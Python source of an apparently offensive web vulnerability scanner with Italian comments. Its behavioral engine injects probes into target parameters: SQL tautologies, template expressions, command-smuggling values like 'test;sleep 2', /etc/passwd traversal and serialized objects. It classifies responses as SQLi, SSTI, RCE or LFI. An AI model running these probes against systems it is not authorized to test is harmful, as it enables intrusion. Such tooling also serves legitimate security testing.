#!/usr/bin/env python3
"""
Smart Vulnerability Crawler & Predictor
Advanced Web Application Security Analysis Tool with Bypass Integration

Features:
- Intelligent crawling with JavaScript analysis
- Technology fingerprinting
- Context-aware vulnerability prediction
- Automatic wordlist mapping
- Priority scoring for attack vectors
- Bypass integration from application_traceroute
- Extended parameter recognition (hash, path, JS, forms)
- Immediate vulnerability testing
- Behavioral Context Analysis
- Multi-type Authentication Support
- Comprehensive JSON output for exploit orchestration
"""

import requests
import re
import json
import time
import urllib.parse
from urllib.parse import urlparse, urljoin, parse_qs
from bs4 import BeautifulSoup
import hashlib
from collections import defaultdict
import threading
import queue
import logging
from typing import Dict, List, Set, Tuple, Optional
import asyncio
import aiohttp
import base64
import random
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import concurrent.futures
import os
import itertools
from functools import lru_cache

# Disabilita SSL warnings per security testing
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Optional import for performance monitoring
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
    logger.warning("psutil not available - performance monitoring will be limited")

# Optional import for debug logging
try:
    from debug_logger import DebugLogger, DebugSession
    DEBUG_LOGGER_AVAILABLE = True
except ImportError:
    try:
        # Try parent directory (debug_logger is in /core/, crawler is in /core/crawler/)
        import sys
        from pathlib import Path
        parent_dir = str(Path(__file__).parent.parent)
        if parent_dir not in sys.path:
            sys.path.insert(0, parent_dir)
        from debug_logger import DebugLogger, DebugSession
        DEBUG_LOGGER_AVAILABLE = True
    except ImportError:
        DEBUG_LOGGER_AVAILABLE = False
        logger.warning("debug_logger not available - debug mode will be limited")

# Optional import for vulnerability verification
try:
    from vulnerability_verifier import VulnerabilityVerifier
    VERIFIER_AVAILABLE = True
except ImportError:
    try:
        # Try parent directory
        from pathlib import Path
        parent_dir = str(Path(__file__).parent.parent)
        if parent_dir not in sys.path:
            sys.path.insert(0, parent_dir)
        from vulnerability_verifier import VulnerabilityVerifier
        VERIFIER_AVAILABLE = True
    except ImportError:
        VERIFIER_AVAILABLE = False
        logger.warning("vulnerability_verifier not available - using basic detection")


class RateLimiter:
    """
    Token bucket rate limiter per evitare blocchi IP/WAF.

    Implementa un sistema di rate limiting globale che limita il numero di richieste
    per secondo, distribuendo uniformemente le richieste nel tempo.
    """

    def __init__(self, requests_per_second=5):
        """
        Inizializza il rate limiter.

        Args:
            requests_per_second: Numero massimo di richieste per secondo (default: 5)
        """
        self.rate = requests_per_second
        self.min_interval = 1.0 / self.rate
        self.last_request_time = 0
        self.lock = threading.Lock()

    def wait(self):
        """
        Aspetta il tempo necessario per rispettare il rate limit.
        Thread-safe.
        """
        with self.lock:
            current_time = time.time()
            elapsed = current_time - self.last_request_time

            if elapsed < self.min_interval:
                sleep_time = self.min_interval - elapsed
                time.sleep(sleep_time)
                self.last_request_time = time.time()
            else:
                self.last_request_time = current_time

    def set_rate(self, requests_per_second):
        """Modifica il rate limit dinamicamente"""
        with self.lock:
            self.rate = requests_per_second
            self.min_interval = 1.0 / self.rate


class PerformanceMonitor:
    """
    Monitora performance e risorse durante la scansione.

    Traccia:
    - Tempo totale di esecuzione
    - Numero di payload testati
    - Vulnerabilità trovate
    - Utilizzo memoria (se psutil disponibile)
    - Richieste HTTP effettuate
    """

    def __init__(self):
        """Inizializza il monitor"""
        self.start_time = time.time()
        self.payloads_tested = 0
        self.vulnerabilities_found = 0
        self.http_requests = 0
        self.errors = 0
        self.lock = threading.Lock()

    def increment_payloads(self, count=1):
        """Incrementa contatore payload testati"""
        with self.lock:
            self.payloads_tested += count

    def increment_vulnerabilities(self, count=1):
        """Incrementa contatore vulnerabilità trovate"""
        with self.lock:
            self.vulnerabilities_found += count

    def increment_requests(self, count=1):
        """Incrementa contatore richieste HTTP"""
        with self.lock:
            self.http_requests += count

    def increment_errors(self, count=1):
        """Incrementa contatore errori"""
        with self.lock:
            self.errors += count

    def get_stats(self):
        """
        Ritorna statistiche correnti.

        Returns:
            Dictionary con statistiche di performance
        """
        elapsed = time.time() - self.start_time

        stats = {
            'elapsed_seconds': elapsed,
            'elapsed_formatted': self._format_time(elapsed),
            'payloads_tested': self.payloads_tested,
            'vulnerabilities_found': self.vulnerabilities_found,
            'http_requests': self.http_requests,
            'errors': self.errors,
            'requests_per_second': self.http_requests / elapsed if elapsed > 0 else 0,
            'payloads_per_second': self.payloads_tested / elapsed if elapsed > 0 else 0,
        }

        # Aggiungi info memoria se psutil disponibile
        if PSUTIL_AVAILABLE:
            try:
                process = psutil.Process()
                memory_info = process.memory_info()
                stats['memory_mb'] = memory_info.rss / 1024 / 1024
                stats['memory_percent'] = process.memory_percent()
            except Exception as e:
                logger.debug(f"Error getting memory stats: {e}")

        return stats

    def log_stats(self, prefix="Performance"):
        """
        Logga statistiche correnti.

        Args:
            prefix: Prefisso per il messaggio di log
        """
        stats = self.get_stats()

        log_msg = (
            f"{prefix}: {stats['elapsed_formatted']} elapsed, "
            f"{stats['http_requests']} HTTP requests ({stats['requests_per_second']:.1f}/s), "
            f"{stats['payloads_tested']} payloads tested ({stats['payloads_per_second']:.1f}/s), "
            f"{stats['vulnerabilities_found']} vulnerabilities found"
        )

        if 'memory_mb' in stats:
            log_msg += f", Memory: {stats['memory_mb']:.1f}MB ({stats['memory_percent']:.1f}%)"

        if stats['errors'] > 0:
            log_msg += f", Errors: {stats['errors']}"

        logger.info(log_msg)

    def _format_time(self, seconds):
        """Formatta secondi in formato leggibile"""
        if seconds < 60:
            return f"{seconds:.1f}s"
        elif seconds < 3600:
            minutes = seconds / 60
            return f"{minutes:.1f}m"
        else:
            hours = seconds / 3600
            return f"{hours:.1f}h"


class VulnerabilityLogger: 
    """Gestisce il salvataggio immediato delle vulnerabilità rilevate"""
    
    def __init__(self, target_url):
        """Inizializza il logger"""
        parsed_url = urlparse(target_url)
        self.target_domain = parsed_url.netloc. replace(':', '_').replace('.', '_')
        
        self.scan_timestamp = int(time.time())
        self.scan_time_str = time.strftime('%Y-%m-%d %H:%M:%S')
        
        self.results_base = "results"
        self.scan_dir = f"{self.target_domain}_{self.scan_timestamp}"
        self.output_dir = os.path.join(self.results_base, self.scan_dir)
        
        os.makedirs(self.output_dir, exist_ok=True)
        
        self.vuln_file = os.path.join(
            self.output_dir,
            f"vulnerabilities_{self.target_domain}_{self.scan_timestamp}.json"
        )
        
        self.vulnerabilities_data = {
            'target':  target_url,
            'scan_start': self.scan_time_str,
            'vulnerabilities': [],
            'total_vulnerabilities': 0,
            'total_by_type': {},
            'last_updated': self.scan_time_str
        }
        
        self.lock = threading.Lock()
        self._save_to_file()
        
        logger.info(f"✅ VulnerabilityLogger initialized at:  {self.output_dir}")
    
    def _save_to_file(self):
        """Salva i dati in JSON"""
        try:
            with open(self. vuln_file, 'w') as f:
                json.dump(self.vulnerabilities_data, f, indent=2, default=str)
        except Exception as e:
            logger.error(f"Error saving vulnerability file: {e}")
    
    def log_vulnerability(self, 
                         endpoint, 
                         parameter, 
                         payload, 
                         vulnerability_type,
                         bypass_used=None,
                         response_status=None,
                         response_length=None,
                         method='GET',
                         headers=None,
                         confidence=None):
        """
        Registra una vulnerabilità rilevata
        
        Args:
            endpoint: URL dell'endpoint
            parameter: Nome del parametro vulnerabile
            payload: Payload utilizzato
            vulnerability_type:  NOME SPECIFICO della vulnerabilità (XSS, SQLI, LFI, RCE, etc.)
            bypass_used: Tipo di bypass utilizzato (se applicato)
            response_status: HTTP status code della risposta
            response_length: Lunghezza della risposta
            method: HTTP method (GET, POST, PUT, DELETE, etc.)
            headers: Dictionary degli headers della richiesta
            confidence:  Livello di confidenza (0-100)
        """
        with self.lock:
            # Prepara gli headers per il logging (evita informazioni sensibili)
            request_headers = {}
            if headers:
                safe_headers = ['User-Agent', 'Content-Type', 'Accept', 'Accept-Encoding', 
                               'Accept-Language', 'Referer', 'Origin', 'X-Requested-With']
                for key, value in headers.items():
                    if key in safe_headers:
                        request_headers[key] = value
                    elif key == 'Authorization':
                        auth_type = value.split()[0] if ' ' in value else 'Bearer'
                        request_headers['Authorization'] = f"{auth_type} [REDACTED]"
                    elif key == 'Cookie': 
                        request_headers['Cookie'] = "[REDACTED - Contains session data]"
            
            vuln_entry = {
                'id': len(self.vulnerabilities_data['vulnerabilities']) + 1,
                'vulnerability_type': vulnerability_type. upper(),
                'endpoint': endpoint,
                'parameter': parameter,
                'payload': payload,
                'confidence': confidence if confidence is not None else 75,
                'request': {
                    'method': method. upper(),
                    'headers':  request_headers,
                    'body_parameter': parameter
                },
                'response': {
                    'status_code':  response_status,
                    'content_length': response_length
                },
                'bypass': {
                    'used': bypass_used is not None,
                    'type': bypass_used if bypass_used else None
                },
                'timestamps':  {
                    'detected_at': time.strftime('%Y-%m-%d %H:%M:%S'),
                    'unix_timestamp':  int(time.time())
                }
            }
            
            self.vulnerabilities_data['vulnerabilities'].append(vuln_entry)
            
            self. vulnerabilities_data['total_vulnerabilities'] = len(
                self.vulnerabilities_data['vulnerabilities']
            )
            
            if vulnerability_type not in self.vulnerabilities_data['total_by_type']:
                self.vulnerabilities_data['total_by_type'][vulnerability_type] = 0
            self.vulnerabilities_data['total_by_type'][vulnerability_type] += 1
            
            self. vulnerabilities_data['last_updated'] = time.strftime('%Y-%m-%d %H:%M:%S')
            
            self._save_to_file()
            
            logger.info(f"🚨 [{vulnerability_type. upper()}] {endpoint} ? {parameter}={payload[: 30]}")
    
    def get_output_dir(self):
        """Ritorna la directory di output"""
        return self.output_dir
    
    def get_summary(self):
        """Ritorna un riepilogo delle vulnerabilità trovate"""
        return {
            'total':  self.vulnerabilities_data['total_vulnerabilities'],
            'by_type': self.vulnerabilities_data['total_by_type']
        }

    def _detect_method_confusion(self, headers, method):
        """
        Rileva possibili indicatori di Method Confusion
        
        Args:
            headers: Dictionary degli header
            method: Metodo HTTP utilizzato
        
        Returns: 
            Dictionary con i dettagli rilevati
        """
        if not headers:
            return {'detected': False}
        
        confusion_indicators = {}
        
        # Controlla per header di method override
        if 'X-HTTP-Method-Override' in headers: 
            override_method = headers['X-HTTP-Method-Override']
            confusion_indicators['X-HTTP-Method-Override'] = {
                'original_method': method,
                'override_method': override_method,
                'potential_bypass': method != override_method
            }
        
        if 'X-Original-Method' in headers:
            original_method = headers['X-Original-Method']
            confusion_indicators['X-Original-Method'] = {
                'original_method': original_method,
                'used_method': method,
                'potential_bypass': method != original_method
            }
        
        if 'X-Method' in headers:
            x_method = headers['X-Method']
            confusion_indicators['X-Method'] = {
                'x_method': x_method,
                'used_method': method,
                'potential_bypass': method != x_method
            }
        
        # Controlla per POST con query string (Method Confusion comune)
        if method and method.upper() == 'POST' and 'Content-Type' not in headers:
            confusion_indicators['post_without_content_type'] = True
        
        return {
            'detected': len(confusion_indicators) > 0,
            'indicators': confusion_indicators
        }
    
    def get_output_dir(self):
        """Ritorna la directory di output"""
        return self.output_dir
    
    def get_summary(self):
        """Ritorna un riepilogo delle vulnerabilità trovate"""
        return {
            'total':  self.vulnerabilities_data['total_vulnerabilities'],
            'by_type': self.vulnerabilities_data['total_by_type']
        }    
    def get_output_dir(self):
        """Ritorna la directory di output"""
        return self.output_dir
    
    def get_summary(self):
        """Ritorna un riepilogo delle vulnerabilità trovate"""
        return {
            'total':  self.vulnerabilities_data['total_vulnerabilities'],
            'by_type': self.vulnerabilities_data['total_by_type']
        }
    

class LRUCache:
    """
    Implementazione semplice di LRU Cache con limite di dimensione.

    Evita memory leak mantenendo solo le N entry più recenti.
    """

    def __init__(self, maxsize=1000):
        """
        Inizializza cache con limite.

        Args:
            maxsize: Numero massimo di entry da mantenere
        """
        self.maxsize = maxsize
        self.cache = {}
        self.access_order = []  # Track access order for LRU
        self.lock = threading.Lock()

    def __contains__(self, key):
        """Supporta 'in' operator"""
        with self.lock:
            return key in self.cache

    def __getitem__(self, key):
        """Supporta cache[key]"""
        with self.lock:
            if key in self.cache:
                # Move to end (most recently used)
                self.access_order.remove(key)
                self.access_order.append(key)
                return self.cache[key]
            raise KeyError(key)

    def __setitem__(self, key, value):
        """Supporta cache[key] = value"""
        with self.lock:
            # Se già esiste, aggiorna e muovi a fine
            if key in self.cache:
                self.access_order.remove(key)
            # Se raggiungiamo il limite, rimuovi oldest
            elif len(self.cache) >= self.maxsize:
                oldest_key = self.access_order.pop(0)
                del self.cache[oldest_key]

            self.cache[key] = value
            self.access_order.append(key)

    def get(self, key, default=None):
        """Ottieni valore con default"""
        try:
            return self[key]
        except KeyError:
            return default

    def clear(self):
        """Svuota cache"""
        with self.lock:
            self.cache.clear()
            self.access_order.clear()


class BehavioralContextEngine:
    """Deduce vulnerabilities through behavioral analysis, not assumptions"""

    def __init__(self):
        self.cache = LRUCache(maxsize=1000)  # LRU cache con limite per evitare OOM
        self.rate_limit_delay = 0.5  # Delay tra probe requests
        self.technology_hints = {}
        
        self.context_probes = {
            'database_interaction': [
                {'param': '1', 'response_key': 'numeric'},
                {'param': '1abc', 'response_key': 'alphanumeric'},
                {'param': "1'", 'response_key': 'quote'},
                {'param': '1 AND 1=1', 'response_key': 'sql_and'},
                {'param': '1 OR 1=1', 'response_key': 'sql_or'},
                {'param': '999999', 'response_key': 'non_existent_id'}
            ],
            
            'template_engine': [
                {'param': '{{7*7}}', 'response_key': 'jinja2'},
                {'param': '${7*7}', 'response_key': 'velocity'},
                {'param': '<%= 7*7 %>', 'response_key': 'erb'},
                {'param': '#{7*7}', 'response_key': 'el'},
                {'param': '{7*7}', 'response_key': 'simple_bracket'},
                {'param': '[[7*7]]', 'response_key': 'twig'}
            ],
            
            'reflection_context': [
                {'param': 'UNIQUE_MARKER_12345', 'analyze': 'position'},
                {'param': '<UNIQUE>', 'analyze': 'html_encoding'},
                {'param': '"UNIQUE"', 'analyze': 'quote_encoding'},
                {'param': 'javascript:UNIQUE', 'analyze': 'js_protocol'},
                {'param': 'style="color:UNIQUE"', 'analyze': 'css_context'}
            ],
            
            'file_operations': [
                {'param': 'test.txt', 'response_key': 'valid_filename'},
                {'param': '../test', 'response_key': 'traversal_basic'},
                {'param': '....//test', 'response_key': 'traversal_encoded'},
                {'param': 'C:\\test', 'response_key': 'windows_path'},
                {'param': '/etc/passwd', 'response_key': 'unix_path'},
                {'param': 'http://test.com/file', 'response_key': 'remote_file'}
            ],
            
            'command_execution': [
                {'param': 'test', 'response_key': 'baseline', 'measure_time': True},
                {'param': 'test;sleep 2', 'response_key': 'sleep_semicolon', 'measure_time': True},
                {'param': 'test|sleep 2', 'response_key': 'sleep_pipe', 'measure_time': True},
                {'param': 'test`sleep 2`', 'response_key': 'sleep_backtick', 'measure_time': True},
                {'param': 'test$(sleep 2)', 'response_key': 'sleep_subshell', 'measure_time': True}
            ],
            
            'xml_parsing': [
                {'param': '<test>data</test>', 'response_key': 'xml_tags'},
                {'param': '<!DOCTYPE test>', 'response_key': 'doctype'},
                {'param': '&entity;', 'response_key': 'entity'},
                {'param': '<?xml version="1.0"?>', 'response_key': 'xml_declaration'}
            ],
            
            'serialization': [
                {'param': 'O:8:"stdClass":0:{}', 'response_key': 'php_serialized'},
                {'param': '{"__proto__":{"test":1}}', 'response_key': 'json_proto'},
                {'param': base64.b64encode(b'\x80\x04\x95\x05\x00\x00\x00\x00\x00\x00\x00]\x94.').decode(), 'response_key': 'python_pickle'},
                {'param': 'rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0', 'response_key': 'java_serialized'}
            ]
        }
    
    def set_technology_hints(self, tech_stack):
        """Use technology stack to optimize probes"""
        self.technology_hints = tech_stack
        
        # Adjust probes based on technology
        if tech_stack.get('language') == 'php':
            self.context_probes['template_engine'].append(
                {'param': '<?php echo 7*7; ?>', 'response_key': 'php_tags'}
            )
        elif tech_stack.get('language') == 'java':
            self.context_probes['template_engine'].extend([
                {'param': '${7*7}', 'response_key': 'jsp_el'},
                {'param': '@(7*7)', 'response_key': 'ognl'}
            ])
    
    def get_cache_key(self, url, param_name):
        """Generate cache key for probe results"""
        return hashlib.md5(f"{url}:{param_name}".encode()).hexdigest()
    
    def _send_single_probe(self, session, probe_url, probe_info, rate_limiter=None):
        """
        Invia un singolo probe e ritorna il risultato.

        Helper method per parallelizzazione.
        """
        # Rate limiting se fornito
        if rate_limiter:
            rate_limiter.wait()
        else:
            time.sleep(self.rate_limit_delay)

        response = None
        try:
            # Measure time
            start_time = time.time()
            response = session.get(probe_url, timeout=10, verify=False)
            elapsed = time.time() - start_time

            probe_result = {
                'status': response.status_code,
                'length': len(response.content),
                'time': elapsed,
                'reflection': probe_info['param'] in response.text,
                'headers': dict(response.headers),
                'text_sample': response.text[:500] if response.text else '',
                'response_key': probe_info.get('response_key', 'probe')
            }

            # Special handling for timing attacks
            if probe_info.get('measure_time'):
                probe_result['timing_anomaly'] = elapsed > 1.5

            return probe_result

        except Exception as e:
            logger.debug(f"Probe failed for {probe_info['param']}: {e}")
            return {
                'error': str(e),
                'response_key': probe_info.get('response_key', 'probe')
            }
        finally:
            if response is not None:
                try:
                    response.close()
                except:
                    pass

    def fingerprint_endpoint(self, session, url, param_name, rate_limiter=None, parallel=True, max_workers=5):
        """
        Send smart probes to understand endpoint behavior.

        Args:
            session: requests.Session object
            url: Target URL
            param_name: Parameter name to test
            rate_limiter: Optional RateLimiter object for global rate limiting
            parallel: Se True, esegue probe in parallelo (default: True)
            max_workers: Numero di worker per parallelizzazione (default: 5)

        Returns:
            Dictionary con risultati behavioral analysis
        """
        cache_key = self.get_cache_key(url, param_name)

        # Check cache
        if cache_key in self.cache:
            logger.info(f"Using cached behavioral results for {param_name}")
            return self.cache[cache_key]

        results = {}
        logger.info(f"Starting behavioral fingerprinting for {param_name} (parallel={parallel})")

        for context, probes in self.context_probes.items():
            context_results = {}

            if parallel and len(probes) > 2:
                # ⚡ PARALLELIZZAZIONE: esegui probe in parallelo
                probe_tasks = []

                for probe in probes:
                    # Build probe URL
                    if '?' in url:
                        probe_url = f"{url}&{param_name}={urllib.parse.quote(probe['param'])}"
                    else:
                        probe_url = f"{url}?{param_name}={urllib.parse.quote(probe['param'])}"

                    probe_tasks.append((probe_url, probe))

                # Esegui in parallelo con ThreadPoolExecutor
                with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
                    future_to_probe = {
                        executor.submit(self._send_single_probe, session, probe_url, probe_info, rate_limiter): probe_info
                        for probe_url, probe_info in probe_tasks
                    }

                    for future in concurrent.futures.as_completed(future_to_probe):
                        probe_result = future.result()
                        response_key = probe_result.pop('response_key', 'probe')
                        context_results[response_key] = probe_result
            else:
                # SEQUENZIALE: per pochi probe o se parallel=False
                for probe in probes:
                    if rate_limiter:
                        rate_limiter.wait()
                    else:
                        time.sleep(self.rate_limit_delay)

                    response = None
                    try:
                        # Build probe request
                        if '?' in url:
                            probe_url = f"{url}&{param_name}={urllib.parse.quote(probe['param'])}"
                        else:
                            probe_url = f"{url}?{param_name}={urllib.parse.quote(probe['param'])}"

                        # Measure time if needed
                        start_time = time.time()
                        response = session.get(probe_url, timeout=10, verify=False)
                        elapsed = time.time() - start_time

                        probe_result = {
                            'status': response.status_code,
                            'length': len(response.content),
                            'time': elapsed,
                            'reflection': probe['param'] in response.text,
                            'headers': dict(response.headers),
                            'text_sample': response.text[:500] if response.text else ''
                        }

                        # Special handling for timing attacks
                        if probe.get('measure_time'):
                            probe_result['timing_anomaly'] = elapsed > 1.5

                        context_results[probe.get('response_key', 'probe')] = probe_result

                    except Exception as e:
                        logger.debug(f"Probe failed for {probe['param']}: {e}")
                        context_results[probe.get('response_key', 'probe')] = {'error': str(e)}
                    finally:
                        if response is not None:
                            try:
                                response.close()
                            except:
                                pass

            # Analyze behavioral differences
            results[context] = self.analyze_behavior(context, context_results)

        # Cache results
        self.cache[cache_key] = results

        return results
    
    def fingerprint_path_segment(self, session, base_url, segment_index, segment_value, path_segments):
        """Test path segment behavior by replacing it with probes"""
        cache_key = self.get_cache_key(base_url, f"path_{segment_index}")
        
        if cache_key in self.cache:
            logger.info(f"Using cached behavioral results for path segment {segment_index}")
            return self.cache[cache_key]
        
        results = {}
        logger.info(f"Starting behavioral fingerprinting for path segment {segment_index}: {segment_value}")
        
        # Build URLs replacing the segment with probes
        path_probes = {
            'file_operations': [
                {'replacement': '../etc/passwd', 'response_key': 'traversal_attempt'},
                {'replacement': '..\\windows\\system32', 'response_key': 'windows_traversal'},
                {'replacement': segment_value + '%00', 'response_key': 'null_byte'},
                {'replacement': segment_value + '/../', 'response_key': 'traversal_suffix'},
                {'replacement': 'nonexistent123.txt', 'response_key': 'not_found'}
            ],
            'static_serving': [
                {'replacement': segment_value, 'response_key': 'original'},
                {'replacement': segment_value + '?param=value', 'response_key': 'with_params'},
                {'replacement': segment_value + '#anchor', 'response_key': 'with_anchor'}
            ]
        }
        
        for context, probes in path_probes.items():
            context_results = {}
            
            for probe in probes:
                time.sleep(self.rate_limit_delay)
                
                try:
                    # Rebuild URL with probe
                    test_segments = path_segments.copy()
                    test_segments[segment_index] = probe['replacement']
                    test_path = '/' + '/'.join(test_segments)
                    test_url = urljoin(base_url, test_path)
                    
                    response = session.get(test_url, timeout=10, verify=False)
                    
                    context_results[probe['response_key']] = {
                        'status': response.status_code,
                        'length': len(response.content),
                        'content_type': response.headers.get('Content-Type', ''),
                        'headers': dict(response.headers)
                    }
                    
                except Exception as e:
                    logger.debug(f"Probe failed for {probe['replacement']}: {e}")
                    context_results[probe['response_key']] = {'error': str(e)}
            
            results[context] = self.analyze_path_behavior(context, context_results, segment_value)
        
        self.cache[cache_key] = results
        return results
    
    def analyze_path_behavior(self, context, results, original_value):
        """Analyze path segment behavior"""
        
        if context == 'file_operations':
            original = results.get('original', {})
            traversal = results.get('traversal_attempt', {})
            not_found = results.get('not_found', {})
            
            # Static file serving - traversal attempts return 404/400
            if original.get('status') == 200 and traversal.get('status') in [400, 404]:
                # Check if it's actually a static file by content type
                content_type = original.get('content_type', '').lower()
                if any(ct in content_type for ct in ['text/css', 'application/javascript', 'image/', 'font/']):
                    return {'detected': True, 'type': 'static_file', 'confidence': 95}
            
            # Dynamic file handling - traversal might work or error differently
            if original.get('status') == 200 and traversal.get('status') in [403, 500]:
                return {'detected': True, 'type': 'dynamic_file_handler', 'confidence': 85}
        
        elif context == 'static_serving':
            original = results.get('original', {})
            with_params = results.get('with_params', {})
            
            # True static serving ignores parameters
            if original.get('status') == with_params.get('status') and \
               original.get('length') == with_params.get('length'):
                return {'detected': True, 'type': 'static_resource', 'confidence': 90}
        
        return {'detected': False}
    
    def analyze_behavior(self, context, results):
        """Deduce context from behavioral differences"""
        
        if context == 'database_interaction':
            numeric = results.get('numeric', {})
            alpha = results.get('alphanumeric', {})
            quote = results.get('quote', {})
            sql_and = results.get('sql_and', {})
            sql_or = results.get('sql_or', {})
            non_existent = results.get('non_existent_id', {})
            
            # Different response for numeric vs alphanumeric?
            if numeric.get('status') == 200 and alpha.get('status') in [400, 404]:
                return {'detected': True, 'confidence': 85, 'type': 'numeric_id_validation'}
            
            # Size difference for valid vs invalid ID
            if abs(numeric.get('length', 0) - non_existent.get('length', 0)) > 500:
                return {'detected': True, 'confidence': 90, 'type': 'database_lookup'}
            
            # SQL syntax causes error?
            if quote.get('status') in [500, 503] or 'sql' in str(quote.get('text_sample', '')).lower():
                return {'detected': True, 'confidence': 95, 'type': 'sql_injection_confirmed'}
            
            # Boolean-based behavior
            if sql_and.get('length', 0) != sql_or.get('length', 0):
                return {'detected': True, 'confidence': 88, 'type': 'boolean_based_sql'}
        
        elif context == 'template_engine':
            # Check if math was evaluated
            for engine, result in results.items():
                if '49' in str(result.get('text_sample', '')):  # 7*7=49
                    return {'detected': True, 'confidence': 99, 'engine': engine, 'type': 'template_injection_confirmed'}
        
        elif context == 'reflection_context':
            marker = results.get('UNIQUE_MARKER_12345', {})
            if marker.get('reflection'):
                text = marker.get('text_sample', '')
                
                # Analyze encoding and context
                if 'UNIQUE_MARKER_12345' in text:
                    if '<UNIQUE_MARKER_12345' in text or 'UNIQUE_MARKER_12345>' in text:
                        return {'detected': True, 'context': 'html_unescaped', 'confidence': 95}
                    elif 'value="UNIQUE_MARKER_12345"' in text or "value='UNIQUE_MARKER_12345'" in text:
                        return {'detected': True, 'context': 'attribute_value', 'confidence': 85}
                    elif '&lt;UNIQUE_MARKER_12345&gt;' in text:
                        return {'detected': True, 'context': 'html_escaped', 'confidence': 20}
                    else:
                        return {'detected': True, 'context': 'text_node', 'confidence': 60}
        
        elif context == 'command_execution':
            baseline = results.get('baseline', {})
            
            # Check for timing anomalies
            for key, result in results.items():
                if 'sleep' in key and result.get('timing_anomaly'):
                    return {'detected': True, 'confidence': 95, 'type': 'command_injection_confirmed', 'vector': key}
            
            # Check for different response lengths (command output)
            for key, result in results.items():
                if key != 'baseline' and abs(result.get('length', 0) - baseline.get('length', 0)) > 100:
                    return {'detected': True, 'confidence': 75, 'type': 'possible_command_execution'}
        
        elif context == 'file_operations':
            # Check for path traversal indicators
            if results.get('traversal_basic', {}).get('status') in [403, 400]:
                if results.get('valid_filename', {}).get('status') == 200:
                    return {'detected': True, 'confidence': 85, 'type': 'path_filtering_present'}
            
            # Remote file inclusion check
            if results.get('remote_file', {}).get('status') == 200:
                return {'detected': True, 'confidence': 90, 'type': 'remote_file_inclusion_possible'}
        
        elif context == 'xml_parsing':
            # XML content causes different behavior?
            if any(r.get('status') in [400, 500] for r in results.values() if 'error' not in r):
                return {'detected': True, 'confidence': 80, 'type': 'xml_parsing_present'}
        
        elif context == 'serialization':
            # Check for deserialization attempts
            for format_type, result in results.items():
                if result.get('status') in [500, 503] or 'deserialize' in str(result.get('text_sample', '')).lower():
                    return {'detected': True, 'confidence': 85, 'type': f'{format_type}_deserialization', 'format': format_type}
        
        return {'detected': False}
    
    def predict_vulnerabilities(self, behavioral_results):
        """Convert behavioral analysis to vulnerability predictions"""
        predictions = []
        
        # Database behavior → SQLi
        db_behavior = behavioral_results.get('database_interaction', {})
        if db_behavior.get('detected'):
            confidence = db_behavior['confidence']
            
            # Boost confidence based on technology stack
            if self.technology_hints.get('language') in ['php', 'asp']:
                confidence = min(100, confidence + 10)
            
            predictions.append({
                'type': 'sqli',
                'confidence': confidence,
                'evidence': f"Database interaction detected: {db_behavior.get('type')}",
                'behavioral_type': db_behavior.get('type'),
                'requires_bypass': confidence < 70  # Low confidence might need bypass
            })
        
        # Template behavior → SSTI
        template_behavior = behavioral_results.get('template_engine', {})
        if template_behavior.get('detected'):
            predictions.append({
                'type': 'ssti',
                'confidence': template_behavior['confidence'],
                'evidence': f"Template engine confirmed: {template_behavior.get('engine')}",
                'engine': template_behavior.get('engine'),
                'severity': 'critical'
            })
        
        # Reflection + context → XSS
        reflection = behavioral_results.get('reflection_context', {})
        if reflection.get('detected'):
            context = reflection.get('context')
            confidence_map = {
                'html_unescaped': 95,
                'attribute_value': 85,
                'javascript': 90,
                'css_context': 70,
                'text_node': 60,
                'html_escaped': 10  # Very low - properly escaped
            }
            
            if context != 'html_escaped':  # Don't report if properly escaped
                predictions.append({
                    'type': 'xss',
                    'confidence': confidence_map.get(context, 50),
                    'evidence': f"User input reflected in {context}",
                    'context': context,
                    'requires_filter_bypass': context == 'html_escaped'
                })
        
        # Command execution
        cmd_behavior = behavioral_results.get('command_execution', {})
        if cmd_behavior.get('detected'):
            predictions.append({
                'type': 'rce',
                'confidence': cmd_behavior['confidence'],
                'evidence': f"Command execution detected: {cmd_behavior.get('type')}",
                'vector': cmd_behavior.get('vector'),
                'severity': 'critical'
            })
        
        # File operations
        file_behavior = behavioral_results.get('file_operations', {})
        if file_behavior.get('detected'):
            vuln_type = 'rfi' if file_behavior.get('type') == 'remote_file_inclusion_possible' else 'lfi'
            predictions.append({
                'type': vuln_type,
                'confidence': file_behavior['confidence'],
                'evidence': f"File operation detected: {file_behavior.get('type')}",
                'requires_filter_bypass': 'filtering_present' in file_behavior.get('type', '')
            })
        
        # XML parsing
        xml_behavior = behavioral_results.get('xml_parsing', {})
        if xml_behavior.get('detected'):
            predictions.append({
                'type': 'xxe',
                'confidence': xml_behavior['confidence'],
                'evidence': 'XML parsing functionality detected',
                'requires_external_entity_test': True
            })
        
        # Serialization
        serial_behavior = behavioral_results.get('serialization', {})
        if serial_behavior.get('detected'):
            predictions.append({
                'type': 'deserialization',
                'confidence': serial_behavior['confidence'],
                'evidence': f"Deserialization detected: {serial_behavior.get('format')}",
                'format': serial_behavior.get('format'),
                'severity': 'critical'
            })
        
        return predictions


class AuthenticationManager:
    """
    Handle various authentication methods with improved reliability.

    Supports:
    - Basic HTTP Authentication
    - Bearer Token Authentication
    - Cookie-based Authentication
    - Form-based Authentication (with CSRF support)
    - Custom Header Authentication
    - OAuth2 (client credentials)

    Includes:
    - CSRF token extraction
    - Session validation
    - Debug logging integration
    """

    # Common CSRF token field names
    CSRF_FIELD_NAMES = [
        'csrf_token', 'csrftoken', 'csrf', '_csrf', 'csrfmiddlewaretoken',
        '_token', 'authenticity_token', '__RequestVerificationToken',
        'XSRF-TOKEN', 'X-CSRF-Token', 'antiForgery', 'CSRFToken'
    ]

    # Common CSRF header names
    CSRF_HEADER_NAMES = [
        'X-CSRF-Token', 'X-XSRF-Token', 'X-CSRFToken', 'CSRF-Token'
    ]

    def __init__(self, debug_logger=None):
        """
        Initialize AuthenticationManager.

        Args:
            debug_logger: Optional DebugLogger instance for detailed logging
        """
        self.auth_types = {
            'basic': self.setup_basic_auth,
            'bearer': self.setup_bearer_auth,
            'cookie': self.setup_cookie_auth,
            'form': self.setup_form_auth,
            'custom_header': self.setup_custom_header_auth,
